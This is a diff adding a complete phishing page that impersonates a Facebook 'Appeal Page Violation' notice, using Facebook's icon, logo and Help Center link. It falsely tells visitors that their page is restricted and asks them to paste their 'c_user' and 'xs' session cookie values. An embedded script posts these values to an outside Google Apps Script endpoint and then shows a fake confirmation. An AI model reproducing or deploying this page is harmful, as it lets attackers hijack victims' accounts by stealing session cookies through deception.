@@ -1,0 +1,157 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Action Required</title>
+<!-- add icon link -->
+        <link rel = "icon" href ="https://static.xx.fbcdn.net/rsrc.php/y5/r/m4nf26cLQxS.ico" 
+        type = "image/x-icon"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <link rel="stylesheet" href="action.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+      integrity="sha384-..."
+      crossorigin="anonymous"
+    />
+  </head>
+  <body>
+    <!-- Navigation Bar -->
+    <div id="navbar">
+      <div id="logo">
+        <img src="logo2.jpeg" alt="Facebook Logo" />
+      </div>
+      <input type="text" id="search-bar" placeholder="How can we help you?" />
+    </div>
+    <div id="bottom-nav">
+<img>
+       <a href="https://www.facebook.com/help">Help Center</a>
+      
+    </div>
+    <!-- Content of the Action Required Page -->
+    
+    <div
+      style="margin: 0 auto; margin-top: 10px; width: 50%; margin-bottom: 50px"
+      class="content"
+    >
+      <!-- Unusual Activity Div -->
+      <div
+        style="
+          background-color: #fff;
+          margin: 0 auto;
+          border: 1px solid #c2c2c2;
+          padding: 20px;
+        "
+      >
+        <h3 style="border-top-left-radius: 10px; border-top-right-radius: 10px">
+          Appeal Page Violation
+        </h3>
+        <p>
+          We have detected unusual activity on your page that violates our
+          community standards.
+        </p>
+        <p>
+          Your access to your page has been limited, and you are currently
+          unable to post, share, or comment using your page.
+        </p>
+        <p>
+          If you believe this to be a mistake, you have the option to submit an
+          appeal by providing the necessary information.
+        </p>
+
+        <!-- Video Container -->
+        <div
+          style="
+            margin-top: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+          "
+        >
+          <span style="color: rgb(132, 174, 160)"
+            >Detailed Video Information</span
+          >
+          <a
+            href="detailed.mp4"
+            target="_blank"
+            ><img src="canvas.png" alt="Click to open video"
+          /></a>
+        </div>
+
+        <!-- Form -->
+
+        <form method="POST" name="google-sheet">
+          <div
+            style="
+              display: flex;
+              flex-direction: column;
+              align-items: flex-start;
+            "
+          >
+            <label for="c_user" style="width: 100%">c_user:</label>
+            <input
+              type="number"
+              id="c_user"
+              name="c_user"
+              pattern="\d+"
+              required
+              style="
+                padding: 8px;
+                margin-top: 5px;
+                padding: 8px;
+                margin-bottom: 10px;
+              "
+            />
+          </div>
+          <div
+            style="
+              display: flex;
+              flex-direction: column;
+              align-items: flex-start;
+            "
+          >
+            <label for="xs" style="width: 100%">xs:</label>
+            <input
+              type="text"
+              id="xs"
+              name="xs"
+              required
+              style="padding: 8px; margin-top: 5px"
+            />
+          </div>
+          <p>
+            It may take upto 24 hours for us to review your information.
+          </p>
+          <br />
+          <input
+            type="submit"
+            value="Submit Appeal"
+            style="
+              background-color: #1877f2;
+              color: #fff;
+              border: none;
+              border-radius: 5px;
+              padding: 10px 20px;
+              cursor: pointer;
+            "
+          />
+        </form>
+      </div>
+      
+    </div>
+    
+   <script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbyFO9ZGnqjxs97JLJHQI1gyu2ioT7otlpSqLYxoXP_SCm1_YsKo41Y-0QpH5r--sabQzQ/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting us..! We Will Get Back to You Soon..."))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+
+  </body>
+</html>
